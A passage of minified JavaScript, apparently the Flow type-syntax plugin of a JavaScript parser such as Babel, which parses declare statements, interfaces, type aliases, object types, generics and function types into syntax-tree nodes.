Y=J.id=this.parseIdentifier(),W=this.startNode(),G=this.startNode();if(this.match(47))W.typeParameters=this.flowParseTypeParameterDeclaration();else W.typeParameters=null;this.expect(10);let H=this.flowParseFunctionTypeParams();return W.params=H.params,W.rest=H.rest,W.this=H._this,this.expect(11),[W.returnType,J.predicate]=this.flowParseTypeAndPredicateInitialiser(),G.typeAnnotation=this.finishNode(W,"FunctionTypeAnnotation"),Y.typeAnnotation=this.finishNode(G,"TypeAnnotation"),this.resetEndLocation(Y),this.semicolon(),this.scope.declareName(J.id.name,2048,J.id.loc.start),this.finishNode(J,"DeclareFunction")}flowParseDeclare(J,Y){if(this.match(80))return this.flowParseDeclareClass(J);else if(this.match(68))return this.flowParseDeclareFunction(J);else if(this.match(74))return this.flowParseDeclareVariable(J);else if(this.eatContextual(127))if(this.match(16))return this.flowParseDeclareModuleExports(J);else{if(Y)this.raise(l1.NestedDeclareModule,this.state.lastTokStartLoc);return this.flowParseDeclareModule(J)}else if(this.isContextual(130))return this.flowParseDeclareTypeAlias(J);else if(this.isContextual(131))return this.flowParseDeclareOpaqueType(J);else if(this.isContextual(129))return this.flowParseDeclareInterface(J);else if(this.match(82))return this.flowParseDeclareExportDeclaration(J,Y);else this.unexpected()}flowParseDeclareVariable(J){return this.next(),J.id=this.flowParseTypeAnnotatableIdentifier(!0),this.scope.declareName(J.id.name,5,J.id.loc.start),this.semicolon(),this.finishNode(J,"DeclareVariable")}flowParseDeclareModule(J){if(this.scope.enter(0),this.match(134))J.id=super.parseExprAtom();else J.id=this.parseIdentifier();let Y=J.body=this.startNode(),W=Y.body=[];this.expect(5);while(!this.match(8)){let $=this.startNode();if(this.match(83)){if(this.next(),!this.isContextual(130)&&!this.match(87))this.raise(l1.InvalidNonTypeImportInDeclareModule,this.state.lastTokStartLoc);super.parseImport($)}else this.expectContextual(125,l1.UnsupportedStatementInDeclareModule),$=this.flowParseDeclare($,!0);W.push($)}this.scope.exit(),this.expect(8),this.finishNode(Y,"BlockStatement");let G=null,H=!1;return W.forEach(($)=>{if(Iv($)){if(G==="CommonJS")this.raise(l1.AmbiguousDeclareModuleKind,$);G="ES"}else if($.type==="DeclareModuleExports"){if(H)this.raise(l1.DuplicateDeclareModuleExports,$);if(G==="ES")this.raise(l1.AmbiguousDeclareModuleKind,$);G="CommonJS",H=!0}}),J.kind=G||"CommonJS",this.finishNode(J,"DeclareModule")}flowParseDeclareExportDeclaration(J,Y){if(this.expect(82),this.eat(65)){if(this.match(68)||this.match(80))J.declaration=this.flowParseDeclare(this.startNode());else J.declaration=this.flowParseType(),this.semicolon();return J.default=!0,this.finishNode(J,"DeclareExportDeclaration")}else{if(this.match(75)||this.isLet()||(this.isContextual(130)||this.isContextual(129))&&!Y){let W=this.state.value;throw this.raise(l1.UnsupportedDeclareExportKind,this.state.startLoc,{unsupportedExportKind:W,suggestion:Cv[W]})}if(this.match(74)||this.match(68)||this.match(80)||this.isContextual(131))return J.declaration=this.flowParseDeclare(this.startNode()),J.default=!1,this.finishNode(J,"DeclareExportDeclaration");else if(this.match(55)||this.match(5)||this.isContextual(129)||this.isContextual(130)||this.isContextual(131))if(J=this.parseExport(J,null),J.type==="ExportNamedDeclaration")return J.default=!1,delete J.exportKind,this.castNodeTo(J,"DeclareExportDeclaration");else return this.castNodeTo(J,"DeclareExportAllDeclaration")}this.unexpected()}flowParseDeclareModuleExports(J){return this.next(),this.expectContextual(111),J.typeAnnotation=this.flowParseTypeAnnotation(),this.semicolon(),this.finishNode(J,"DeclareModuleExports")}flowParseDeclareTypeAlias(J){this.next();let Y=this.flowParseTypeAlias(J);return this.castNodeTo(Y,"DeclareTypeAlias"),Y}flowParseDeclareOpaqueType(J){this.next();let Y=this.flowParseOpaqueType(J,!0);return this.castNodeTo(Y,"DeclareOpaqueType"),Y}flowParseDeclareInterface(J){return this.next(),this.flowParseInterfaceish(J,!1),this.finishNode(J,"DeclareInterface")}flowParseInterfaceish(J,Y){if(J.id=this.flowParseRestrictedIdentifier(!Y,!0),this.scope.declareName(J.id.name,Y?17:8201,J.id.loc.start),this.match(47))J.typeParameters=this.flowParseTypeParameterDeclaration();else J.typeParameters=null;if(J.extends=[],this.eat(81))do J.extends.push(this.flowParseInterfaceExtends());while(!Y&&this.eat(12));if(Y){if(J.implements=[],J.mixins=[],this.eatContextual(117))do J.mixins.push(this.flowParseInterfaceExtends());while(this.eat(12));if(this.eatContextual(113))do J.implements.push(this.flowParseInterfaceExtends());while(this.eat(12))}J.body=this.flowParseObjectType({allowStatic:Y,allowExact:!1,allowSpread:!1,allowProto:Y,allowInexact:!1})}flowParseInterfaceExtends(){let J=this.startNode();if(J.id=this.flowParseQualifiedTypeIdentifier(),this.match(47))J.typeParameters=this.flowParseTypeParameterInstantiation();else J.typeParameters=null;return this.finishNode(J,"InterfaceExtends")}flowParseInterface(J){return this.flowParseInterfaceish(J,!1),this.finishNode(J,"InterfaceDeclaration")}checkNotUnderscore(J){if(J==="_")this.raise(l1.UnexpectedReservedUnderscore,this.state.startLoc)}checkReservedType(J,Y,W){if(!wv.has(J))return;this.raise(W?l1.AssignReservedType:l1.UnexpectedReservedType,Y,{reservedType:J})}flowParseRestrictedIdentifier(J,Y){return this.checkReservedType(this.state.value,this.state.startLoc,Y),this.parseIdentifier(J)}flowParseTypeAlias(J){if(J.id=this.flowParseRestrictedIdentifier(!1,!0),this.scope.declareName(J.id.name,8201,J.id.loc.start),this.match(47))J.typeParameters=this.flowParseTypeParameterDeclaration();else J.typeParameters=null;return J.right=this.flowParseTypeInitialiser(29),this.semicolon(),this.finishNode(J,"TypeAlias")}flowParseOpaqueType(J,Y){if(this.expectContextual(130),J.id=this.flowParseRestrictedIdentifier(!0,!0),this.scope.declareName(J.id.name,8201,J.id.loc.start),this.match(47))J.typeParameters=this.flowParseTypeParameterDeclaration();else J.typeParameters=null;if(J.supertype=null,this.match(14))J.supertype=this.flowParseTypeInitialiser(14);if(J.impltype=null,!Y)J.impltype=this.flowParseTypeInitialiser(29);return this.semicolon(),this.finishNode(J,"OpaqueType")}flowParseTypeParameter(J=!1){let Y=this.state.startLoc,W=this.startNode(),G=this.flowParseVariance(),H=this.flowParseTypeAnnotatableIdentifier();if(W.name=H.name,W.variance=G,W.bound=H.typeAnnotation,this.match(29))this.eat(29),W.default=this.flowParseType();else if(J)this.raise(l1.MissingTypeParamDefault,Y);return this.finishNode(W,"TypeParameter")}flowParseTypeParameterDeclaration(){let J=this.state.inType,Y=this.startNode();if(Y.params=[],this.state.inType=!0,this.match(47)||this.match(143))this.next();else this.unexpected();let W=!1;do{let G=this.flowParseTypeParameter(W);if(Y.params.push(G),G.default)W=!0;if(!this.match(48))this.expect(12)}while(!this.match(48));return this.expect(48),this.state.inType=J,this.finishNode(Y,"TypeParameterDeclaration")}flowInTopLevelContext(J){if(this.curContext()!==L0.brace){let Y=this.state.context;this.state.context=[Y[0]];try{return J()}finally{this.state.context=Y}}else return J()}flowParseTypeParameterInstantiationInExpression(){if(this.reScan_lt()!==47)return;return this.flowParseTypeParameterInstantiation()}flowParseTypeParameterInstantiation(){let J=this.startNode(),Y=this.state.inType;if(this.state.inType=!0,J.params=[],this.flowInTopLevelContext(()=>{this.expect(47);let W=this.state.noAnonFunctionType;this.state.noAnonFunctionType=!1;while(!this.match(48))if(J.params.push(this.flowParseType()),!this.match(48))this.expect(12);this.state.noAnonFunctionType=W}),this.state.inType=Y,!this.state.inType&&this.curContext()===L0.brace)this.reScan_lt_gt();return this.expect(48),this.finishNode(J,"TypeParameterInstantiation")}flowParseTypeParameterInstantiationCallOrNew(){if(this.reScan_lt()!==47)return;let J=this.startNode(),Y=this.state.inType;J.params=[],this.state.inType=!0,this.expect(47);while(!this.match(48))if(J.params.push(this.flowParseTypeOrImplicitInstantiation()),!this.match(48))this.expect(12);return this.expect(48),this.state.inType=Y,this.finishNode(J,"TypeParameterInstantiation")}flowParseInterfaceType(){let J=this.startNode();if(this.expectContextual(129),J.extends=[],this.eat(81))do J.extends.push(this.flowParseInterfaceExtends());while(this.eat(12));return J.body=this.flowParseObjectType({allowStatic:!1,allowExact:!1,allowSpread:!1,allowProto:!1,allowInexact:!1}),this.finishNode(J,"InterfaceTypeAnnotation")}flowParseObjectPropertyKey(){return this.match(135)||this.match(134)?super.parseExprAtom():this.parseIdentifier(!0)}flowParseObjectTypeIndexer(J,Y,W){if(J.static=Y,this.lookahead().type===14)J.id=this.flowParseObjectPropertyKey(),J.key=this.flowParseTypeInitialiser();else J.id=null,J.key=this.flowParseType();return this.expect(3),J.value=this.flowParseTypeInitialiser(),J.variance=W,this.finishNode(J,"ObjectTypeIndexer")}flowParseObjectTypeInternalSlot(J,Y){if(J.static=Y,J.id=this.flowParseObjectPropertyKey(),this.expect(3),this.expect(3),this.match(47)||this.match(10))J.method=!0,J.optional=!1,J.value=this.flowParseObjectTypeMethodish(this.startNodeAt(J.loc.start));else{if(J.method=!1,this.eat(17))J.optional=!0;J.value=this.flowParseTypeInitialiser()}return this.finishNode(J,"ObjectTypeInternalSlot")}flowParseObjectTypeMethodish(J){if(J.params=[],J.rest=null,J.typeParameters=null,J.this=null,this.match(47))J.typeParameters=this.flowParseTypeParameterDeclaration();if(this.expect(10),this.match(78)){if(J.this=this.flowParseFunctionTypeParam(!0),J.this.name=null,!this.match(11))this.expect(12)}while(!this.match(11)&&!this.match(21))if(J.params.push(this.flowParseFunctionTypeParam(!1)),!this.match(11))this.expect(12);if(this.eat(21))J.rest=this.flowParseFunctionTypeParam(!1);return this.expect(11),J.returnType=this.flowParseTypeInitialiser(),this.finishNode(J,"FunctionTypeAnnotation")}flowParseObjectTypeCallProperty(J,Y){let W=this.startNode();return J.static=Y,J.value=this.flowParseObjectTypeMethodish(W),this.finishNode(J,"ObjectTypeCallProperty")}flowParseObjectType({allowStatic:J,allowExact:Y,allowSpread:W,allowProto:G,allowInexact:H}){let $=this.state.inType;this.state.inType=!0;let z=this.startNode();z.callProperties=[],z.properties=[],z.indexers=[],z.internalSlots=[];let U,K,B=!1;if(Y&&this.match(6))this.expect(6),U=9,K=!0;else this.expect(5),U=8,K=!1;z.exact=K;while(!this.match(U)){let Z=!1,M=null,L=null,R=this.startNode();if(G&&this.isContextual(118)){let F=this.lookahead();if(F.type!==14&&F.type!==17)this.next(),M=this.state.startLoc,J=!1}if(J&&this.isContextual(106)){let F=this.lookahead();if(F.type!==14&&F.type!==17)this.next(),Z=!0}let j=this.flowParseVariance();if(this.eat(0)){if(M!=null)this.unexpected(M);if(this.eat(0)){if(j)this.unexpected(j.loc.start);z.internalSlots.push(this.flowParseObjectTypeInternalSlot(R,Z))}else z.indexers.push(this.flowParseObjectTypeIndexer(R,Z,j))}else if(this.match(10)||this.match(47)){if(M!=null)this.unexpected(M);if(j)this.unexpected(j.loc.start);z.callProperties.push(this.flowParseObjectTypeCallProperty(R,Z))}else{let F="init";if(this.isContextual(99)||this.isContextual(104)){let O=this.lookahead();if(Nq(O.type))F=this.state.value,this.next()}let A=this.flowParseObjectTypeProperty(R,Z,M,j,F,W,H!=null?H:!K);if(A===null)B=!0,L=this.state.lastTokStartLoc;else z.properties.push(A)}if(this.flowObjectTypeSemicolon(),L&&!this.match(8)&&!this.match(9))this.raise(l1.UnexpectedExplicitInexactInObject,L)}if(this.expect(U),W)z.inexact=B;let q=this.finishNode(z,"ObjectTypeAnnotation");return this.state.inType=$,q}flowParseObjectTypeProperty(J,Y,W,G,H,$,z){if(this.eat(21)){if(this.match(12)||this.match(13)||this.match(8)||this.match(9)){if(!$)this.raise(l1.InexactInsideNonObject,this.state.lastTokStartLoc);else if(!z)this.raise(l1.InexactInsideExact,this.state.lastTokStartLoc);if(G)this.raise(l1.InexactVariance,G);return null}if(!$)this.raise(l1.UnexpectedSpreadType,this.state.lastTokStartLoc);if(W!=null)this.unexpected(W);if(G)this.raise(l1.SpreadVariance,G);return J.argument=this.flowParseType(),this.finishNode(J,"ObjectTypeSpreadProperty")}else{J.key=this.flowParseObjectPropertyKey(),J.static=Y,J.proto=W!=null,J.kind=H;let U=!1;if(this.match(47)||this.match(10)){if(J.method=!0,W!=null)this.unexpected(W);if(G)this.unexpected(G.loc.start);if(J.value=this.flowParseObjectTypeMethodish(this.startNodeAt(J.loc.start)),H==="get"||H==="set")this.flowCheckGetterSetterParams(J);if(!$&&J.key.name==="constructor"&&J.value.this)this.raise(l1.ThisParamBannedInConstructor,J.value.this)}else{if(H!=="init")this.unexpected();if(J.method=!1,this.eat(17))U=!0;J.value=this.flowParseTypeInitialiser(),J.variance=G}return J.optional=U,this.finishNode(J,"ObjectTypeProperty")}}flowCheckGetterSetterParams(J){let Y=J.kind==="get"?0:1,W=J.value.params.length+(J.value.rest?1:0);if(J.value.this)this.raise(J.kind==="get"?l1.GetterMayNotHaveThisParam:l1.SetterMayNotHaveThisParam,J.value.this);if(W!==Y)this.raise(J.kind==="get"?x.BadGetterArity:x.BadSetterArity,J);if(J.kind==="set"&&J.value.rest)this.raise(x.BadSetterRestParameter,J)}flowObjectTypeSemicolon(){if(!this.eat(13)&&!this.eat(12)&&!this.match(8)&&!this.match(9))this.unexpected()}flowParseQualifiedTypeIdentifier(J,Y){J!=null||(J=this.state.startLoc);let W=Y||this.flowParseRestrictedIdentifier(!0);while(this.eat(16)){let G=this.startNodeAt(J);G.qualification=W,G.id=this.flowParseRestrictedIdentifier(!0),W=this.finishNode(G,"QualifiedTypeIdentifier")}return W}flowParseGenericType(J,Y){let W=this.startNodeAt(J);if(W.typeParameters=null,W.id=this.flowParseQualifiedTypeIdentifier(J,Y),this.match(47))W.typeParameters=this.flowParseTypeParameterInstantiation();return this.finishNode(W,"GenericTypeAnnotation")}flowParseTypeofType(){let J=this.startNode();return this.expect(87),J.argument=this.flowParsePrimaryType(),this.finishNode(J,"TypeofTypeAnnotation")}flowParseTupleType(){let J=this.startNode();J.types=[],this.expect(0);while(this.state.pos<this.length&&!this.match(3)){if(J.types.push(this.flowParseType()),this.match(3))break;this.expect(12)}return this.expect(3),this.finishNode(J,"TupleTypeAnnotation")}flowParseFunctionTypeParam(J){let Y=null,W=!1,G=null,H=this.startNode(),$=this.lookahead(),z=this.state.type===78;if($.type===14||$.type===17){if(z&&!J)this.raise(l1.ThisParamMustBeFirst,H);if(Y=this.parseIdentifier(z),this.eat(17)){if(W=!0,z)this.raise(l1.ThisParamMayNotBeOptional,H)}G=this.flowParseTypeInitialiser()}else G=this.flowParseType();return H.name=Y,H.optional=W,H.typeAnnotation=G,this.finishNode(H,"FunctionTypeParam")}reinterpretTypeAsFunctionTypeParam(J){let Y=this.startNodeAt(J.loc.start);return Y.name=null,Y.optional=!1,Y.typeAnnotation=J,this.finishNode(Y,"FunctionTypeParam")}flowParseFunctionTypeParams(J=[]){let Y=null,W=null;if(this.match(78)){if(W=this.flowParseFunctionTypeParam(!0),W.name=null,!this.match(11))this.expect(12)}while(!this.match(11)&&!this.match(21))if(J.push(this.flowParseFunctionTypeParam(!1)),!this.match(11))this.expect(12);if(this.eat(21))Y=this.flowParseFunctionTypeParam(!1);return{params:J,rest:Y,_this:W}}flowIdentToTypeAnnotation(J,Y,W){switch(W.name){case"any":return this.finishNode(Y,"AnyTypeAnnotation");case"bool":case"boolean":return this.finishNode(Y,"BooleanTypeAnnotation");case"mixed":return this.finishNode(Y,"MixedTypeAnnotation");case"empty":return this.finishNode(Y,"EmptyTypeAnnotation");case"number":return this.finishNode(Y,"NumberTypeAnnotation");case"string":return this.finishNode(Y,"StringTypeAnnotation");case"symbol":return this.finishNode(Y,"SymbolTypeAnnotation");default:return this.checkNotUnderscore(W.name),this.flowParseGenericType(J,W)}}flowParsePrimaryType(){let J=this.state.startLoc,Y=this.startNode(),W,G,H=!1,$=this.state.noAnonFunctionType;switch(this.state.type){case 5:return this.flowParseObjectType({allowStatic:!1,allowExact:!1,allowSpread:!0,allowProto:!1,allowInexact:!0});case 6:return this.flowParseObjectType({allowStatic:!1,allowExact:!0,allowSpread:!0,allowProto:!1,allowInexact:!1});case 0:return this.state.noAnonFunctionType=!1,G=this.flowParseTupleType(),this.state.noAnonFunctionType=$,G;case 47:{let z=this.startNode();return z.typeParameters=this.flowParseTypeParameterDeclaration(),this.expect(10),W=this.flowParseFunctionTypeParams(),z.params=W.params,z.rest=W.rest,z.this=W._this,this.expect(11),this.expect(19),z.returnType=this.flowParseType(),this.finishNode(z,"FunctionTypeAnnotation")}case 10:{let z=this.startNode();if(this.next(),!this.match(11)&&!this.match(21))if(w0(this.state.type)||this.match(78)){let U=this.lookahead().type;H=U!==17&&U!==14}else H=!0;if(H)if(this.state.noAnonFunctionType=!1,G=this.flowParseType(),this.state.noAnonFunctionType=$,this.state.noAnonFunctionType||!(this.match(12)||this.match(11)&&this.lookahead().type===19))return this.expect(11),G;else this.eat(12);if(G)W=this.flowParseFunctionTypeParams([this.reinterpretTypeAsFunctionTypeParam(G)]);else W=this.flowParseFunctionTypeParams();return z.params=W.params,z.rest=W.rest,z.this=W._this,this.expect(11),this.expect(19),z.returnType=this.flowParseType(),z.typeParameters=null,this.finishNode(z,"FunctionTypeAnnotation")}case 134:return this.parseLiteral(this.state.value,"StringLiteralTypeAnnotation");case 85:case 86:return Y.value=this.match(85),this.next(),this.finishNode(Y,"BooleanLiteralTypeAnnotation");case 53:if(this.state.value==="-"){if(this.next(),this.match(135))return this.parseLiteralAtNode(-this.state.value,"NumberLiteralTypeAnnotation",Y);if(this.match(136))return this.parseLiteralAtNode(-this.state.value,"BigIntLiteralTypeAnnotation",Y);throw this.raise(l1.UnexpectedSubtractionOperand,this.state.startLoc)}this.unexpected();return;case 135:return this.parseLiteral(this.state.value,"NumberLiteralTypeAnnotation");case 136:return this.parseLiteral(this.state.value,"BigIntLiteralTypeAnnotation");case 88:return this.next(),this.finishNode(Y,"VoidTypeAnnotation");case 84:return this.next(),this.finishNode(Y,"NullLiteralTypeAnnotation");case 78:return this.next(),this.finishNode(Y,"ThisTypeAnnotation");case 55:return this.next(),this.finishNode(Y,"ExistsTypeAnnotation");case 87:return this.flowParseTypeofType();default:if(TH(this.state.type)){let z=VX(this.state.type);return this.next(),super.createIdentifier(Y,z)}else if(w0(this.state.type)){if(this.isContextual(129))return this.flowParseInterfaceType();return this.flowIdentToTypeAnnotation(J,Y,this.parseIdentifier())}}this.unexpected()}flowParsePostfixType(){let J=this.state.startLoc,Y=this.flowParsePrimaryType(),W=!1;while((this.match(0)||this.match(18))&&!this.canInsertSemicolon()){let G=this.startNodeAt(J),H=this.eat(18);if(W=W||H,this.expect(0),!H&&this.match(3))G.elementType=Y,this.next(),Y=this.finishNode(G,"ArrayTypeAnnotation");else if(G.objectType=Y,G.indexType=this.flowParseType(),this.expect(3),W)G.optional=H,Y=this.finishNode(G,"OptionalIndexedAccessType");else Y=this.finishNode(G,"IndexedAccessType")}return Y}flowParsePrefixType(){let J=this.startNode();if(this.eat(17))return J.typeAnnotation=this.flowParsePrefixType(),this.finishNode(J,"NullableTypeAnnotation");else return this.flowParsePostfixType()}flowParseAnonFunctionWithoutParens(){let J=this.flowParsePrefixType();if(!this.state.noAnonFunctionType&&this.eat(19)){let Y=this.startNodeAt(J.loc.start);return Y.params=[this.reinterpretTypeAsFunctionTypeParam(J)],Y.rest=null,Y.this=null,Y.returnType=this.flowParseType(),Y.typeParameters=null,this.finishNode(Y,"FunctionTypeAnnotation")}return J}flowParseIntersectionType(){let J=this.startNode();this.eat(45);let Y=this.flowParseAnonFunctionWithoutParens();J.types=[Y];while(this.eat(45))J.types.push(this.flowParseAnonFunctionWithoutParens());return J.types.length===1?Y:this.finishNode(J,"IntersectionTypeAnnotation")}flowParseUnionType(){let J=this.startNode();this.eat(43);let Y=this.flowParseIntersectionType();J.types=[Y];while(this.eat(43))J.types.push(this.flowParseIntersectionType());return J.types.length===1?Y:this.finishNode(J,"UnionTypeAnnotation")}flowParseType(){let J=this.state.inType;this.state.inType=!0;let Y=this.flowParseUnionType();return this.state.inType=J,Y}flowParseTypeOrImplicitInstantiation(){if(this.state.type===132&&this.state.value==="_"){let J=this.state.startLoc,Y=this.parseIdentifier();return this.flowParseGenericType(J,Y)}else return this.flowParseType()}flowParseTypeAnnotation(){let J=this.startNode();return J.typeAnnotation=this.flowParseTypeInitialiser(),this.finishNode(J,"TypeAnnotation")}flowParseTypeAnnotatableIdentifier(J){let Y=J?this.parseIdentifier():this.flowParseRestrictedIdentifier();if(this.match(14))Y.typeAnnotation=this.flowParseTypeAnnotation(),this.resetEndLocation(Y);return Y}typeCastToParameter(J){return J.expression.typeAnnotation=J.typeAnnotation,this.resetEndLocation(J.expression,J.typeAnnotation.loc.end),J.expression}flowParseVariance(){let J=null;if(this.match(53)){if(J=this.startNode(),this.state.value==="+")J.kind="plus";else J.kind="minus";return this.next(),this.finishNode(J,"Variance")}return J}parseFunctionBody(J,Y,W=!1){if(Y){this.forwardNoArrowParamsConversionAt(J,()=>super.parseFunctionBody(J,!0,W));return}super.parseFunctionBody(J,!1,W)}parseFunctionBodyAndFinish(J,Y,W=!1){if(this.match(14)){let G=this.startNode();[G.typeAnnotation,J.predicate]=this.flowParseTypeAndPredicateInitialiser(),J.returnType=G.typeAnnotation?this.finishNode(G,"TypeAnnotation"):null}return super.parseFunctionBodyAndFinish(J,Y,W)}parseStatementLike(J){if(this.state.strict&&this.isContextual(129)){let W=this.lookahead();if(C6(W.type)){let G=this.startNode();return this.next(),this.flowParseInterface(G)}}else if(this.isContextual(126)){let W=this.startNode();return this.next(),this.flowParseEnumDeclaration(W)}let Y=super.parseStatementLike(J);if(this.flowPragma===void 0&&!this.isValidDirective(Y))this.flowPragma=null;return Y}parseExpressionStatement(J,Y,W){if(Y.type==="Identifier"){if(Y.name==="declare"){if(this.match(80)||w0(this.state.type)||this.match(68)||this.match(74)||this.match(82))return this.flowParseDeclare(J)}else if(w0(this.state.type)){if(Y.name==="interface")return this.flowParseInterface(J);else if(Y.name==="type")return this.flowParseTypeAlias(J);else if(Y.name==="opaque")return this.flowParseOpaqueType(J,!1)}}return super.parseExpressionStatement(J,Y,W)}shouldParseExportDeclaration(){let{type:J}=this.state;if(J===126||Bq(J))return!this.state.containsEsc;return super.shouldParseExportDeclaration()}isExportDefaultSpecifier(){let{type:J}=this.state;if(J===126||Bq(J))return this.state.containsEsc;return super.isExportDefaultSpecifier()}parseExportDefaultExpression(){if(this.isContextual(126)){let J=this.startNode();return this.next(),this.flowParseEnumDeclaration(J)}return super.parseExportDefaultExpression()}parseConditional(J,Y,W){if(!this.match(17))return J;if(this.state.maybeInArrowParameters){let q=this.lookaheadCharCode();if(q===44||q===61||q===58||q===41)return this.setOptionalParametersError(W),J}this.expect(17);let G=this.state.clone(),H=this.state.noArrowAt,$=this.startNodeAt(Y),{consequent:z,failed:U}=this.tryParseConditionalConsequent(),[K,B]=this.getArrowLikeExpressions(z);if(U||B.length>0){let q=[...H];if(B.length>0){this.state=G,this.state.noArrowAt=q;for(let Z=0;Z<B.length;Z++)q.push(B[Z].start);({consequent:z,failed:U}=this.tryParseConditionalConsequent()),[K,B]=this.getArrowLikeExpressions(z)}if(U&&K.length>1)this.raise(l1.AmbiguousConditionalArrow,G.startLoc);if(U&&K.length===1)this.state=G,q.push(K[0].start),this.state.noArrowAt=q,{consequent:z,failed:U}=this.tryParseConditionalConsequent()}return this.getArrowLikeExpressions(z,!0),this.state.noArrowAt=H,this.expect(14),$.test=J,$.consequent=z,$.alternate=this.forwardNoArrowParamsConversionAt($,()=>this.parseMaybeAssign(void 0,void 0)),this.finishNode($,"ConditionalExpression")}tryParseConditionalConsequent(){this.state.noArrowParamsConversionAt.push(this.state.start);let J=this.parseMaybeAssignAllowIn(),Y=!this.match(14);return this.state.noArrowParamsConversionAt.pop(),{consequent:J,failed:Y}}getArrowLikeExpressions(J,Y){let W=[J],G=[];while(W.length!==0){let H=W.pop();if(H.type==="ArrowFunctionExpression"&&H.body.type!=="BlockStatement"){if(H.typeParameters||!H.returnType)this.finishArrowValidation(H);else G.push(H);W.push(H.body)}else if(H.type==="ConditionalExpression")W.push(H.consequent),W.push(H.alternate)}if(Y)return G.forEach((H)=>this.finishArrowValidation(H)),[G,[]];return Pv(G,(H)=>H.params.every(($)=>this.isAssignable($,!0)))}finishArrowValidation(J){var Y;this.toAssignableList(J.params,(Y=J.extra)==null?void 0:Y.trailingCommaLoc,!1),this.scope.enter(518),super.checkParams(J,!1,!0),this.scope.exit()}forwardNoArrowParamsConversionAt(J,Y){let W;if(this.state.noArrowParamsConversionAt.includes(this.offsetToSourcePos(J.start)))this.state.noArrowParamsConversionAt.push(this.state.start),W=Y(),this.state.noArrowParamsConversionAt.pop();else W=Y();return W}parseParenItem(J,Y){let W=super.parseParenItem(J,Y);if(this.eat(17))W.optional=!0,this.resetEndLocation(J);if(this.match(14)){let G=this.startNodeAt(Y);return G.expression=W,G.typeAnnotation=this.flowParseTypeAnnotation(),this.finishNode(G,"TypeCastExpression")}return W}assertModuleNodeAllowed(J){if(J.type==="ImportDeclaration"&&(J.importKind==="type"||J.importKind==="typeof")||J.type==="ExportNamedDeclaration"&&J.exportKind==="type"||J.type==="ExportAllDeclaration"&&J.exportKind==="type")return;super.assertModuleNodeAllowed(J)}parseExportDeclaration(J){if(this.isContextual(130)){J.exportKind="type";let Y=this.startNode();if(this.next(),this.match(5))return J.specifiers=this.parseExportSpecifiers(!0),super.parseExportFrom(J),null;else return this.flowParseTypeAlias(Y)}else if(this.isContextual(131)){J.exportKind="type";let Y=this.startNode();return this.next(),this.flowParseOpaqueType(Y,!1)}else if(this.isContextual(129)){J.exportKind="type";let Y=this.startNode();return this.next(),this.flowParseInterface(Y)}else if(this.isContextual(126)){J.exportKind="value";let Y=this.startNode();return this.next(),this.flowParseEnumDeclaration(Y)}else return super.parseExportDeclaration(J)}eatExportStar(J){if(super.eatExportStar(J))return!0;if(this.isContextual(130)&&this.lookahead().type===55)return J.exportKind="type",this.next(),this.next(),!0;return!1}maybeParseExportNamespaceSpecifier(J){let{startLoc:Y}=this.state,W=super.maybeParseExportNamespaceSpecifier(J);if(W&&J.exportKind==="type")this.unexpected(Y);return W}parseClassId(J,Y,W){if(super.parseClassId(J,Y,W),this.match(47))J.typeParameters=this.flowParseTypeParameterDeclaration()}parseClassMember(J,Y,W){let{startLoc:G}=this.state;if(this.isContextual(125)){if(super.parseClassMemberFromModifier(J,Y))return;Y.declare=!0}if(super.parseClassMember(J,Y,W),Y.declare){if(Y.type!=="ClassProperty"&&Y.type!=="ClassPrivateProperty"&&Y.type!=="PropertyDefinition")this.raise(l1.DeclareClassElement,G);else if(Y.value)this.raise(l1.DeclareClassFieldInitializer,Y.value)}}isIterator(J){return J==="iterator"||J==="asyncIterator"}readIterator(){let J=super.readWord1(),Y="@@"+J;if(!this.isIterator(J)||!this.state.inType)this.raise(x.InvalidIdentifier,this.state.curPosition(),{identifierName:Y});this.finishToken(132,Y)}getTokenFromCode(J){let Y=this.input.charCodeAt(this.state.pos+1);if(J===123&&Y===124)this.finishOp(6,2);else if(this.state.inType&&(J===62||J===60))this.finishOp(J===62?48:47,1);else if(this.state.inType&&J===63)if(Y===46)this.finishOp(18,2);else this.finishOp(17,1);else if(Lv(J,Y,this.input.charCodeAt(this.state.pos+2)))this.state.pos+=2,this.readIterator();else super.getTokenFromCode(J)}isAssignable(J,Y){if(J.type==="TypeCastExpression")return this.isAssignable(J.expression,Y);else return super.isAssignable(J,Y)}toAssignable(J,Y=!1){if(!Y&&J.type==="AssignmentExpression"&&J.left.type==="TypeCastExpression")J.left=this.typeCastToParameter(J.left);super.toAssignable(J,Y)}toAssignableList(J,Y,W){for(let G=0;G<J.length;G++){let H=J[G];if((H==null?void 0:H.type)==="TypeCastExpression")J[G]=this.typeCastToParameter(H)}super.toAssignableList(J,Y,W)}toReferencedList(J,Y){for(let G=0;G<J.length;G++){var W;let H=J[G];if(H&&H.type==="TypeCastExpression"&&!((W=H.extra)!=null&&W.parenthesized)&&(J.length>1||!Y))this.raise(l1.TypeCastInPattern,H.typeAnnotation)}return J}parseArrayLike(J,Y,W,G){let H=super.parseArrayLike(J,Y,W,G);if(Y&&!this.state.maybeInArrowParameters)this.toReferencedList(H.elements);return H}isValidLVal(J,Y,W){return J==="TypeCastExpression"||super.isValidLVal(J,Y,W)}parseClassProperty(J){if(this.match(14))J.typeAnnotation=this.flowParseTypeAnnotation();return super.parseClassProperty(J)}parseClassPrivateProperty(J){if(this.match(14))J.typeAnnotation=this.flowParseTypeAnnotation();return super.parseClassPrivateProperty(J)}isClassMethod(){return this.match(47)||super.isClassMethod()}isClassProperty(){return this.match(14)||super.isClassProperty()}isNonstaticConstructor(J){return!this.match(14)&&super.isNonstaticConstructor(J)}pushClassMethod(J,Y,W,G,H,$){if(Y.variance)this.unexpected(Y.variance.loc.start);if(delete Y.variance,this.match(47))Y.typeParameters=this.flowParseTypeParameterDeclaration();if(super.pushClassMethod(J,Y,W,G,H,$),Y.params&&H){let z=Y.params;if(z.length>0&&this.isThisParam(z[0]))this.raise(l1.ThisParamBannedInConstructor,Y)}else if(Y.type==="MethodDefinition"&&H&&Y.value.params){let z=Y.value.params;if(z.length>0&&this.isThisParam(z[0]))this.raise(l1.ThisParamBannedInConstructor,Y)}}pushClassPrivateMethod(J,Y,W,G){if(Y.variance)this.unexpected(Y.variance.loc.start);if(delete Y.variance,this.match(47))Y.typeParameters=this.flowParseTypeParameterDeclaration();super.pushClassPrivateMethod(J,Y,W,G)}parseClassSuper(J){if(super.parseClassSuper(J),J.superClass&&(this.match(47)||this.match(51)))J.superTypeParameters=this.flowParseTypeParameterInstantiationInExpression();if(this.isContextual(113)){this.next();let Y=J.implements=[];do{let 